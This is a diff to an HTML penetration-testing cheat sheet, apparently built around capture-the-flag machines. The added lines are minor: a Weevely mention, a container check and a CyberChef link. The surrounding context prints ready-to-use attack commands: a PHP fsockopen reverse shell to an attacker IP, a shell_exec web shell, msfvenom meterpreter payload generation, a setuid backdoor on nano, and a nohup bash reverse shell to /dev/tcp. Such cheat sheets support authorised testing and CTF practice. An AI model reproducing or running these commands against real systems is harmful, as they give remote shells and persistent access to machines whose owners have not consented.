@@ -645,6 +645,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKE
 </pre>
 <p><font size="3.5" color="black">PHP</font></p>
 <pre style="background-color:black;color:white;">
+Weevely (default on Kali)
 php -r '$sock=fsockopen("[ATTACKER's_IP_ADDRESS]",[ATTACKER's_PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'	(reverse shell)
 <?php echo shell_exec($_GET['cmd']);?>	(invoke cmd - usage: [URL]?cmd=[COMMAND])
 msfvenom -p php/meterpreter_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f raw > shell.php && echo '<?php ' | cat - shell.php > temp && mv temp shell.php && echo '?>' >> shell.php	(reverse shell using msfvenom)
@@ -868,6 +869,10 @@ sudo -u scriptmanager bash -i
 scriptmanager@bashed:/tmp$ whoami
 whoami
 scriptmanager
+</pre>
+<p><font size="3.5" color="black">Am I inside a container?</font></p>
+<pre style="background-color:black;color:white;">
+cat /proc/self/cgroup	
 </pre>
 <p><font size="3.5" color="black">What's the distribution type? What version?</font></p>
 <pre style="background-color:black;color:white;">
@@ -1309,6 +1314,7 @@ chmod u+s /bin/nano    # installs the backdoor
 <hr>
 <p><h3>More</h3></p>
 <pre style="background-color:black;color:white;">
+CyberChef - https://gchq.github.io/CyberChef/
 nohup - run a command immune to hangups, with output to a non-tty (example: "nohup bash -i >& /dev/tcp/10.10.14.47/9001 0>&1 &")
 exiftool [FILE]	#extract file's metadata
 binwalk #tool for searching binary images for embedded files and executable code
